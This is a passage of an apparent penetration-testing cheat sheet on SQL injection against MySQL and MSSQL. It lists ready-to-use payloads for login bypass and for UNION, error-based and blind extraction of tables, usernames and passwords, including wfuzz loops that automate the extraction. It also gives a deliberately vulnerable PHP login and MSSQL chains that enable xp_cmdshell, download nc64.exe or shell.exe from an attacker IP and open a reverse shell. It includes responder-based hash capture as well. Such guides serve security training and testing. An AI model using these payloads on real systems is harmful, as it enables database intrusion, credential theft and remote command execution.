CONCAT(&lt;string1&gt;, &lt;string2&gt;, ...)    -- Concatenate strings such as tables, column names
LENGTH(&lt;string&gt;)                     -- Calculate the number of characters for a given string
SUBSTR(&lt;string&gt;, &lt;offset&gt;, &lt;length&gt;) -- Print string character(s) by providing offset and length
ASCII(&lt;character&gt;)                   -- Decimal representation of the character
SLEEP(&lt;number of seconds&gt;)           -- Go to sleep for &lt;number of seconds&gt;
IF(&lt;condition&gt;, &lt;true action&gt;, &lt;false action&gt;) -- Conditional if statement
LIKE &quot;&lt;string&gt;%&quot;                     -- Checks if provided string is present
OUTFILE &quot;&lt;url to file&gt;&quot;              -- Dump output of select statement into a file
LOAD_FILE(&quot;&lt;url to file&gt;&quot;)          -- Dump the content of a file
</code></pre>
              <ul>
                <li><strong>MSSQL</strong></li>
              </ul>
              <pre><code class="language-sql">SELECT TOP &lt;number&gt; * FROM &lt;table&gt;   -- Equivalent of LIMIT for MSSQL
COUNT(*) AS Total                     -- Display number of rows
NEWID()                               -- Generate random unique identifier
CAST(&lt;expression&gt; AS &lt;data_type&gt;)    -- Cast expression to a specific data type
SELECT DB_NAME()                      -- Get the current database name
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = &#39;&lt;table&gt;&#39;  -- Get column names
</code></pre>
              <h5 id="3522-error-based-payloads">3.5.2.2 Error-Based Payloads</h5>
              <p><strong>Simple authentication bypass</strong></p>
              <pre><code class="language-bash">&lt;input&gt;&#39; OR 1=1 -- //
</code></pre>
              <p><strong>Get the version</strong></p>
              <pre><code class="language-bash">&lt;input&gt;&#39; OR 1=1 in (SELECT @@version) -- //
</code></pre>
              <p><strong>Dump all or specific data</strong></p>
              <ul>
                <li>Dump all data:</li>
              </ul>
              <pre><code class="language-bash">&lt;input&gt;&#39; OR 1=1 in (SELECT * FROM &lt;table&gt;) -- //

# Example
&lt;input&gt;&#39; OR 1=1 in (SELECT * FROM users) -- //
</code></pre>
              <ul>
                <li>Dump specific data:</li>
              </ul>
              <pre><code class="language-bash">&lt;input&gt;&#39; OR 1=1 in (SELECT &lt;column&gt; FROM &lt;table&gt; WHERE &lt;condition&gt;) -- //

# Example
&#39; or 1=1 in (SELECT password FROM users WHERE username = &#39;admin&#39;) -- //
</code></pre>
              <h5 id="3523-union-based-payloads">3.5.2.3 UNION-Based Payloads</h5>
              <ul>
                <li><strong>Check Column Count</strong>: for both MySQL and MSSQL, determine the number of columns the
                  <code>SELECT</code> query expects.
                </li>
              </ul>
              <pre><code class="language-bash"># MySQL &amp; MSSQL
&lt;input&gt;&#39; ORDER BY &lt;number&gt; -- -
</code></pre>
              <ul>
                <li><strong>Use <code>wfuzz</code> to Find Number of Columns</strong></li>
              </ul>
              <pre><code class="language-sql">-- MySQL
wfuzz -c -z range,1-10 &quot;http://website.com/index.php?id=1 ORDER BY FUZZ&quot;

-- MSSQL
wfuzz -c -z range,1-10 &quot;http://website.com/index.php?id=1 ORDER BY FUZZ&quot;
</code></pre>
              <ul>
                <li><strong>Database Enumeration</strong>: retrieve the name of the current database.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, DATABASE(), 4, 5; -- -

# MSSQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, DB_NAME(), 4, 5; -- -
</code></pre>
              <ul>
                <li><strong>Table Enumeration</strong>: list all the tables from the current database.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, table_name, 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -

# MSSQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, TABLE_NAME, 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
</code></pre>
              <ul>
                <li><strong>Column Enumeration</strong>: list all the columns in a specific table.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, column_name, 4, 5 FROM information_schema.columns WHERE table_name=&#39;&lt;tablename&gt;&#39;; -- -

# MSSQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;&lt;tablename&gt;&#39;; -- -
</code></pre>
              <ul>
                <li><strong>Retrieve Information From Other Databases</strong></li>
              </ul>
              <pre><code class="language-bash">&lt;input&gt;&#39; UNION SELECT NULL, &lt;column_1&gt;, &lt;column_2&gt;, &lt;column_3&gt; FROM information_schema.columns WHERE table_schema=DATABASE() -- -

# Examples
%&#39; UNION SELECT database(), user(), @@version, null, null -- -
# or
&#39; union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -
</code></pre>
              <ul>
                <li><strong>Retrieve Data from Columns</strong>: extract data from specific columns.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, CONCAT(column1, column2), 4, 5 FROM &lt;tablename&gt; LIMIT 0, 1; -- -

# MSSQL
http://&lt;site&gt;/report.php?id=-23&#39; UNION SELECT 1, 2, column1 + column2, 4, 5 FROM &lt;tablename&gt; -- -
</code></pre>
              <ul>
                <li><strong>Determine Number of Columns</strong>: find the correct number of columns.</li>
              </ul>
              <pre><code class="language-bash"># MySQL &amp; MSSQL
http://website.com/index.php?id=1 ORDER BY &lt;number&gt; -- -
</code></pre>
              <ul>
                <li><strong>Identify Union Columns</strong>: identify which columns are injectable.</li>
              </ul>
              <pre><code class="language-bash"># MySQL &amp; MSSQL
http://website.com/index.php?id=-1 UNION SELECT &lt;number of columns separated by commas&gt; -- -
</code></pre>
              <ul>
                <li><strong>Dump Table Content to FileSystem</strong>: write content from a table into a file.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT &lt;column1&gt;, &lt;column2&gt; FROM &lt;table_name&gt; INTO OUTFILE &quot;&lt;file_path&gt;&quot; -- +

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT &lt;column1&gt;, &lt;column2&gt; FROM &lt;table_name&gt; EXEC xp_cmdshell &#39;echo &lt;data&gt; &gt; &lt;filename&gt;&#39;
</code></pre>
              <ul>
                <li><strong>Print SQL Version</strong>: determine the database version.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, @@version, 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, @@VERSION, 4, 5 -- -
</code></pre>
              <ul>
                <li><strong>Print User Running the Query</strong>: retrieve the user currently running the query.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, USER(), 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, SUSER_SNAME(), 4, 5 -- -
</code></pre>
              <ul>
                <li><strong>Print Database Directory</strong>: identify the database directory location.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, @@datadir, 4, 5 -- -

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, SERVERPROPERTY(&#39;InstanceName&#39;), 4, 5 -- -
</code></pre>
              <ul>
                <li><strong>Print Table Names</strong>: retrieve a list of table names.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5 FROM information_schema.tables WHERE table_schema=DATABASE(); -- -

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, STRING_AGG(TABLE_NAME, &#39;,&#39;), 4, 5 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG = DB_NAME(); -- -
</code></pre>
              <ul>
                <li><strong>Print Column Names</strong>: retrieve a list of column names from a specific table.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5 FROM information_schema.columns WHERE table_name=&#39;&lt;tablename&gt;&#39;; -- -

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, STRING_AGG(COLUMN_NAME, &#39;,&#39;), 4, 5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=&#39;&lt;tablename&gt;&#39;; -- -
</code></pre>
              <ul>
                <li><strong>Print Content of a Column</strong>: extract specific content from a column.</li>
              </ul>
              <pre><code class="language-bash"># MySQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, GROUP_CONCAT(&lt;column_name&gt;), 4, 5 FROM &lt;table_name&gt;; -- -

# MSSQL
http://website.com/index.php?id=-1&#39; UNION SELECT 1, 2, STRING_AGG(&lt;column_name&gt;, &#39;,&#39;), 4, 5 FROM &lt;table_name&gt;; -- -
</code></pre>
              <ul>
                <li><strong>Use <code>AND</code> Statement as Comment Alternative</strong>: when comments are blocked,
                  use an <code>AND</code> statement.</li>
              </ul>
              <pre><code class="language-bash"># MySQL &amp; MSSQL
http://website.com/index.php?id=1&#39; &lt;SQL_injection_here&gt; AND &#39;1&#39; -- -
</code></pre>
              <h5 id="3524-blind-payloads">3.5.2.4 Blind Payloads</h5>
              <p>Blind SQL Injection allows attackers to infer the database&#39;s behavior indirectly by examining
                server responses or delays. Below are techniques applicable to <strong>MySQL</strong> and
                <strong>MSSQL</strong>.
              </p>
              <h6 id="35241-checking-for-vulnerability">3.5.2.4.1 Checking for Vulnerability</h6>
              <ul>
                <li><strong>Basic Check:</strong></li>
              </ul>
              <pre><code class="language-sql">http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; OR &#39;1&#39;=&#39;1 --+
</code></pre>
              <ul>
                <li><strong>Reflected Input Check:</strong> use these commands to determine if the input is being
                  reflected in the output.</li>
              </ul>
              <pre><code class="language-sql">http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND 1=1 --+

http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND &#39;1&#39;=&#39;1 --+

http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND &#39;1&#39;=&#39;2 --+
</code></pre>
              <h6 id="35242-extracting-database-information">3.5.2.4.2 Extracting Database Information</h6>
              <ul>
                <li><strong>Extract Database Version:</strong> test for the database version using the
                  <code>SUBSTRING</code> (MySQL) or <code>SUBSTRING</code> (MSSQL) functions.
                </li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT SUBSTRING(@@version,1,1)=&#39;5&#39;) --+

# MSSQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT SUBSTRING(@@version,1,1)=&#39;5&#39;) --+
</code></pre>
              <ul>
                <li><strong>Extract Database Name:</strong> extract the database name using <code>SUBSTRING</code> and
                  delay response for a true condition.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND IF(SUBSTRING(database(),1,1)=&#39;a&#39;, SLEEP(5), 0) --+

# MSSQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND IIF(SUBSTRING(DB_NAME(),1,1)=&#39;a&#39;, WAITFOR DELAY &#39;00:00:05&#39;, 0) --+
</code></pre>
              <h6 id="35243-extracting-table-and-column-names">3.5.2.4.3 Extracting Table and Column Names</h6>
              <ul>
                <li><strong>Find Table Names:</strong> extract the first table name from the database.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT COUNT(*) FROM information_schema.tables) &gt; 5 --+

# MSSQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT COUNT(*) FROM sys.tables) &gt; 5 --+
</code></pre>
              <ul>
                <li><strong>Find Column Names in a Table:</strong> extract column names from a specific table.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#39;users&#39;) &gt; 5 --+

# MSSQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT COUNT(*) FROM sys.columns WHERE object_id = OBJECT_ID(&#39;users&#39;)) &gt; 5 --+
</code></pre>
              <h6 id="35244-extracting-data">3.5.2.4.4 Extracting Data</h6>
              <ul>
                <li><strong>Retrieve Specific Data:</strong> extract specific characters from the data using
                  <code>SUBSTRING</code> or equivalent logic.
                </li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)=&#39;a&#39; --+

# MSSQL
http://&lt;host&gt;/vulnerable-page?param=&lt;input&gt;&#39; AND (SELECT TOP 1 SUBSTRING(username,1,1) FROM users)=&#39;a&#39; --+
</code></pre>
              <ul>
                <li><strong>Character Enumeration in Database:</strong> use character enumeration to brute-force data
                  extraction.</li>
              </ul>
              <pre><code class="language-sql">admin&#39; AND SUBSTRING(username,1,1)=&#39;a&#39; --+   # MySQL
admin&#39; AND SUBSTRING(username,1,1)=&#39;a&#39; --+   # MSSQL
</code></pre>
              <h6 id="35245-boolean-based">3.5.2.4.5 Boolean-Based</h6>
              <ul>
                <li><strong>Determine Database Name:</strong> extract the database name using the <code>SUBSTRING</code>
                  function.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/index.php?id=1&#39; AND (SUBSTRING(database(), &lt;offset&gt;, &lt;character_length&gt;))=&#39;&lt;character&gt;&#39; --+

# MSSQL
http://&lt;host&gt;/index.php?id=1&#39; AND (SUBSTRING(DB_NAME(), &lt;offset&gt;, &lt;character_length&gt;))=&#39;&lt;character&gt;&#39; --+
</code></pre>
              <h6 id="35246-time-based">3.5.2.4.6 Time-Based</h6>
              <ul>
                <li><strong>Login Panel Injection (MySQL &amp; MSSQL):</strong> test for time-based SQL injection by
                  delaying the response.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
admin&#39; OR SLEEP(5);--+

# MSSQL
admin&#39; OR WAITFOR DELAY &#39;00:00:05&#39;;--+
</code></pre>
              <ul>
                <li><strong>Using Time-Based Conditions:</strong> use conditions to trigger delays, depending on the
                  true/false evaluation of a statement.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/login.php?user=admin&#39; AND IF(1=1, SLEEP(5), 0) --+

# MSSQL
http://&lt;host&gt;/login.php?user=admin&#39; AND IIF(1=1, WAITFOR DELAY &#39;00:00:05&#39;, 0) --+
</code></pre>
              <ul>
                <li><strong>Confirm a Time-Based Blind SQL Injection:</strong> force the application to sleep if the
                  query returns true.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/index.php?id=1&#39; AND SLEEP(10) --+

# MSSQL
http://&lt;host&gt;/index.php?id=1&#39; AND WAITFOR DELAY &#39;00:00:10&#39; --+
</code></pre>
              <ul>
                <li><strong>Determine Database Version:</strong> identify the database version by inducing a delay based
                  on the condition.</li>
              </ul>
              <pre><code class="language-sql"># MySQL
http://&lt;host&gt;/index.php?id=1&#39; AND IF((SELECT VERSION()) LIKE &#39;5%&#39;, SLEEP(10), NULL) --+

# MSSQL
http://&lt;host&gt;/index.php?id=1&#39; AND IIF((SELECT @@VERSION) LIKE &#39;5%&#39;, WAITFOR DELAY &#39;00:00:10&#39;, NULL) --+
</code></pre>
              <ul>
                <li><strong>Determine Database Name with <code>wfuzz</code></strong>: this command checks each character
                  of the database name by comparing its ASCII value.</li>
              </ul>
              <pre><code class="language-bash"># Uses ASCII value extraction to determine each character of the database name
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 &quot;http://&lt;host&gt;/index.php?id=1&#39; AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+&quot;; 
done &gt; &lt;filename.txt&gt; &amp;&amp; grep &quot;0m9&quot; &lt;filename.txt

# Replace &lt;filename.txt&gt; with the name of the file to store results.
# Replace 10 in $(seq 1 10) with the estimated length of the database name.
# The FUZZ keyword is used by wfuzz to iterate through ASCII values.
</code></pre>
              <ul>
                <li><strong>Determine Table Name with <code>wfuzz</code></strong>: the query retrieves the ASCII value
                  of each character in the first table name.</li>
              </ul>
              <pre><code class="language-bash"># Uses ASCII value extraction to determine each character of the first table name
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 &quot;http://&lt;host&gt;/index.php?id=1&#39; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+&quot;; 
done &gt; &lt;filename.txt&gt; &amp;&amp; grep &quot;0m9&quot; &lt;filename.txt

# Replace table_name and table_schema with the actual names if targeting specific databases or tables.
# Adjust LIMIT 0,1 to enumerate multiple tables by changing the first argument of LIMIT.
</code></pre>
              <ul>
                <li><strong>Determine Column Name with <code>wfuzz</code></strong>: this command retrieves the column
                  names from the targeted table using the <code>information_schema.columns</code>.</li>
              </ul>
              <pre><code class="language-bash"># Uses ASCII value extraction to determine each character of a column name
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,32-127 &quot;http://&lt;host&gt;/index.php?id=1&#39; AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name=&#39;&lt;table_name&gt;&#39; LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+&quot;; 
done &gt; &lt;filename.txt&gt; &amp;&amp; grep &quot;0m9&quot; &lt;filename.txt

# Replace &lt;table_name&gt; with the actual table name you are targeting.
# Adjust LIMIT 0,1 to retrieve column names for different tables.
</code></pre>
              <ul>
                <li><strong>Extract Column Content with <code>wfuzz</code></strong>: he query extracts content from a
                  particular column by comparing ASCII values character by character.</li>
              </ul>
              <pre><code class="language-bash"># Extracts content from a specific column using ASCII value comparison
for i in $(seq 1 10); do 
  wfuzz -v -c -z range,0-10 -z range,32-127 &quot;http://&lt;host&gt;/index.php?id=1&#39; AND IF(ASCII(SUBSTR((SELECT &lt;column_name&gt; FROM &lt;table_name&gt; LIMIT FUZZ,1), $i, 1))=FUZ2Z, SLEEP(10), NULL) --+&quot;; 
done &gt; &lt;filename.txt&gt; &amp;&amp; grep &quot;0m9&quot; &lt;filename.txt

# Replace &lt;column_name&gt; with the column you&#39;re trying to extract (e.g., username, password).
# Replace &lt;table_name&gt; with the actual table name.
# The FUZZ value iterates over possible row entries (use LIMIT FUZZ, 1 to iterate rows).
</code></pre>
              <div class="col-lg text-center" data-aos="fade-up">
                <figure class="figure">
                  <img src="img/automating_blind_sqli.gif" class="img-fluid" alt="Blind SQL Injection with Tools">
                  <figcaption class="figure-caption text-center">Blind SQL Injection with Tools</figcaption>
                </figure>
              </div>
              <h5 id="3525-login-bypass-commands">3.5.2.5 Login Bypass Commands</h5>
              <pre><code class="language-sql">-- Standard OR-based bypass
&#39; OR 1=1 --+

-- Bypass with LIMIT (useful when multiple entries might be returned)
&#39; OR 1=1 LIMIT 1 --+

-- Bypass by using string comparison (a common trick when numeric bypass fails)
&#39; OR &#39;a&#39;=&#39;a --+

-- Using AND to combine conditions and exploit certain scenarios
&#39; OR 3=3 --+

-- More obfuscated example (avoiding use of typical 1=1):
&#39; OR 2=2 --+

-- Bypass with string comparison (works for both MySQL and MSSQL)
&#39; OR &#39;a&#39;=&#39;a&#39; --+

-- OR-based bypass with a numeric comparison
&#39; OR 3=3 --+

-- Bypass with LIMIT for MySQL (restricts to 1 entry)
&#39; OR 1=1 LIMIT 1 --+

-- MSSQL version of limiting output with TOP
&#39; OR 1=1; SELECT TOP 1 * FROM users --+
</code></pre>
              <ul>
                <li><strong>MySQL:</strong></li>
              </ul>
              <pre><code class="language-sql">meh&#39; OR 3=3;#
meh&#39; OR 2=2 LIMIT 1;#
meh&#39; OR &#39;a&#39;=&#39;a
meh&#39; OR 1=1 --+
</code></pre>
              <ul>
                <li><strong>MSSQL:</strong></li>
              </ul>
              <pre><code class="language-sql">meh&#39; OR 3=3;--
meh&#39; OR 2=2;--
meh&#39; OR &#39;a&#39;=&#39;a;--
meh&#39; OR 1=1;--
</code></pre>
              <h5 id="3526-vulnerable-code-example">3.5.2.6 Vulnerable Code Example</h5>
              <p><strong>PHP Login Page</strong></p>
              <pre><code class="language-php">&lt;?php
include &#39;database_connection.php&#39;;
$user = $_POST[&#39;username&#39;];
$pass = $_POST[&#39;password&#39;];
$query = &quot;SELECT * FROM users WHERE username = &#39;$user&#39; AND password = &#39;$pass&#39;&quot;;
$execution = mysqli_query($connection, $query) or die(mysqli_error($connection));
$row = mysqli_fetch_array($execution);

if($row) {
    echo &quot;Login Successful&quot;;
} else {
    echo &quot;Invalid username or password&quot;;
}
?&gt;
</code></pre>
              <h4 id="353-sql-truncation">3.5.3 SQL Truncation</h4>
              <p>Truncation-based SQL injection occurs when the database limits user input based on a specified length,
                discarding any characters beyond that limit. This can be exploited by an attacker to manipulate user
                data. For example, an attacker can create a new user with a name like <code>&#39;admin&#39;</code> and
                their own password, potentially causing multiple entries for the same username. If both entries are
                evaluated as <code>&#39;admin&#39;</code>, the attacker could gain unauthorized access to the legitimate
                admin account.</p>
              <p>In the following example, the database truncates the username after a certain length (e.g., 10
                characters). The attacker uses this to create a conflicting account:</p>
              <pre><code class="language-sql"># Example of truncation; the database discards extra characters
username=admin++++++++(max.length)&amp;password=testpwn123

-- Assume the database has a 10-character limit on the username field, note that more characters are added because otherwise the truncation won&#39;t be made.
username=admin++++++++&amp;password=testpwn123

-- The database truncates the input to admin and discards the extra characters
-- If a user admin already exists, the attacker might be able to bypass authentication.
</code></pre>
              <h4 id="354-specific-databases">3.5.4 Specific Databases</h4>
              <h5 id="3541-mssql">3.5.4.1 MSSQL</h5>
              <h6 id="35411-default-databases">3.5.4.1.1 Default Databases</h6>
              <ul>
                <li><code>master</code>: keeps the information for an instance of SQL Server.</li>
                <li><code>msdb</code>: used by SQL Server Agent.</li>
                <li><code>model</code>: a template database copied for each new database.</li>
                <li><code>resource</code>: a read-only database that keeps system objects visible in every database on
                  the server in sys schema.</li>
                <li><code>tempdb</code>: keeps temporary objects for SQL queries.</li>
              </ul>
              <h6 id="35412-common-commands">3.5.4.1.2 Common Commands</h6>
              <ul>
                <li>List Databases:</li>
              </ul>
              <pre><code class="language-sql">SELECT name FROM master.dbo.sysdatabases
</code></pre>
              <ul>
                <li>Show Tables:</li>
              </ul>
              <pre><code class="language-sql">SELECT table_name FROM &lt;DATABASE&gt;.INFORMATION_SCHEMA.TABLES
</code></pre>
              <ul>
                <li>Show Tables and Their ID:</li>
              </ul>
              <pre><code class="language-sql">union select 1,(select string_agg(concat(name,&#39;:&#39;,id),&#39;|&#39;) from streamio..sysobjects where xtype=&#39;u&#39;),3,4,5,6-- -
</code></pre>
              <ul>
                <li>Concatenate Columns:</li>
              </ul>
              <pre><code class="language-sql">union select 1,concat(username,&#39;:&#39;,password),3,4,5,6 from users--
</code></pre>
              <ul>
                <li>Test <code>xp_cmdshell</code>:</li>
              </ul>
              <pre><code class="language-sql">exec xp_dirtree &#39;c:\&#39;

EXEC xp_cmdshell &#39;ping [attacker_ip]&#39;;
</code></pre>
              <ul>
                <li>Get a Hash:</li>
              </ul>
              <pre><code class="language-sql">-- Attacker
sudo responder -A -I tun0

-- Target
EXEC master..xp_dirtree &#39;\\[Attacker_IP]\share\&#39;
</code></pre>
              <h6 id="35413-statement-examples">3.5.4.1.3 Statement Examples</h6>
              <pre><code class="language-sql">-- Visualize SQL statement and adjust payload
INSERT INTO dbo.tablename (&#39;&lt;user_input&gt;&#39;, &#39;&lt;user_input&gt;&#39;); 

-- Adjust initial payloads
INSERT INTO dbo.tablename (&#39;1 AND 1=CONVERT(INT,@@version))-- &#39;, &#39;&lt;user_input&gt;&#39;); 
INSERT INTO dbo.tablename(&#39;&#39;, CONVERT(INT, db_name(&lt;number&gt;)))-- 

-- Enumerate column names
&#39;, CONVERT(INT, (CHAR(58)+(SELECT DISTINCT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME=&#39;&lt;table_name&gt;&#39; ORDER BY column_name ASC)+CHAR(58))))-- 

-- Enumerate data in columns
&#39;, CONVERT(INT, (CHAR(58)+CHAR(58)+(SELECT TOP 1 &lt;column&gt; FROM &lt;table_name&gt; ORDER BY &lt;column&gt; ASC)+CHAR(58)+CHAR(58))))-- 
</code></pre>
              <h6 id="35414-remote-code-execution-rce">3.5.4.1.4 Remote Code Execution (RCE)</h6>
              <p>For MSSQL on windows we can run any code in SQL Injection, we need to do the following to get the code
                execution.</p>
              <pre><code class="language-sql">-- Use this if you are doing SQL Injection.

-- Enable advanced options
&#39;;EXEC sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;,1; RECONFIGURE;-- 

-- Enable command shell
&#39;;EXEC xp_cmdshell &quot;powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe&quot;;--

-- Execute commands
&#39;;EXEC xp_cmdshell &quot;C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]&quot;;--
</code></pre>
              <pre><code class="language-sql">-- Use this if you have direct access to execute SQL statements.

-- Enable advanced options
EXEC sp_configure &#39;show advanced options&#39;,1;
RECONFIGURE;

-- Enable command shell
EXEC sp_configure &#39;xp_cmdshell&#39;,1
RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell &quot;powershell wget http://[kali_ip]/nc64.exe -o C:\Users\Public\nc64.exe&quot;;
EXEC xp_cmdshell &quot;C:\Users\Public\nc64.exe -t -e C:\Windows\System32\cmd.exe [kali_ip] [listening_port]&quot;;
</code></pre>
              <pre><code class="language-sql">-- Exploitation Example.

-- Enable advanced options
&lt;username&gt;&#39;; EXEC sp_configure &#39;show advanced options&#39;, 1; RECONFIGURE; --

-- Enable command shell
&lt;username&gt;&#39;; EXEC sp_configure &#39;xp_cmdshell&#39;, 1; RECONFIGURE; --

-- Execute commands
&lt;username&gt;&#39;; EXEC master.dbo.xp_cmdshell &#39;ping &lt;attacker_ip&gt;&#39;; --
&lt;username&gt;&#39;; EXEC master.dbo.xp_cmdshell &#39;certutil -urlcache -split -f http://&lt;attacker_ip&gt;:&lt;port&gt;/shell.exe C:\\Windows\\temp\\shell.exe&#39;; --
&lt;username&gt;&#39;; EXEC master.dbo.xp_cmdshell &#39;cmd /c C:\\Windows\\temp\\shell.exe&#39;; --
</code></pre>
              <h6 id="35415-impersonation">3.5.4.1.5 Impersonation</h6>
              <ol>
                <li><strong>Check for Users we can Impersonate</strong>:</li>
              </ol>
              <pre><code class="language-sql">SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = &#39;IMPERSONATE&#39;
</code></pre>
              <ol start="2">
                <li><strong>Perform the Impersonation</strong>:</li>
              </ol>
              <pre><code class="language-sql">EXECUTE AS LOGIN = &#39;sa&#39; SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)
</code></pre>
              <ol start="3">
                <li><strong>Verify Current User and Role</strong>:</li>
              </ol>
              <pre><code class="language-sql">SELECT SYSTEM_USER

SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)

go
</code></pre>
              <ol start="4">
                <li><strong>(Optional)</strong> Check Linked Databases:</li>
              </ol>
              <pre><code class="language-sql">SELECT srvname, isremote FROM sysservers;
</code></pre>
              <ol start="5">
                <li><strong>(Optional)</strong> Enable <code>xp_cmdshell</code>:</li>
              </ol>
              <pre><code class="language-sql">EXEC master.dbo.sp_configure &#39;show advanced options&#39;, 1;

RECONFIGURE;
</code></pre>
              <h6 id="35416-extra-references">3.5.4.1.6 Extra References</h6>
              <ul>
                <li><a href="https://www.tarlogic.com/blog/red-team-tales-0x01/" target="_blank">From MSSQL Injection to
                    RCE</a></li>
                <li><a
                    href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/MSSQL Injection.md#mssql-command-execution"
                    target="_blank">PayloadsAllTheThings
                    MSSQL Injection</a></li>
                <li><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/" target="_blank">MSSQL
                    Practical
                    Injection Cheat Sheet</a></li>
              </ul>
              <h5 id="3542-mysql">3.5.4.2 MySQL</h5>
              <h6 id="35421-default-databases">3.5.4.2.1 Default Databases</h6>
              <ul>
                <li><code>mysql</code>: it is the system database that contains tables that store information required
                  by the MySQL server.</li>
                <li><code>information_schema</code>: provides access to database metadata.</li>
                <li><code>performance_schema</code>: it is a feature for monitoring MySQL Server execution at a low
                  level.</li>
                <li><code>sys</code>: a set of objects that helps DBAs and developers interpret data collected by the
                  Performance Schema.</li>
              </ul>
              <h6 id="35422-common-commands">3.5.4.2.2 Common Commands</h6>
              <ul>
                <li>Connect to the Database:</li>
              </ul>
              <pre><code class="language-bash">mysql -u &lt;username&gt; -p&#39;&lt;password&gt;&#39; -h &lt;host&gt; -P &lt;port&gt;
</code></pre>
              <ul>
                <li>Show Databases:</li>
              </ul>
              <pre><code class="language-sql">SHOW DATABASES;

USE &lt;database_name&gt;;
</code></pre>
              <ul>
                <li>Show Tables:</li>
              </ul>
              <pre><code class="language-sql">SHOW TABLES;

DESCRIBE &lt;table_name&gt;;

SELECT * FROM &lt;table_name&gt;;
</code></pre>
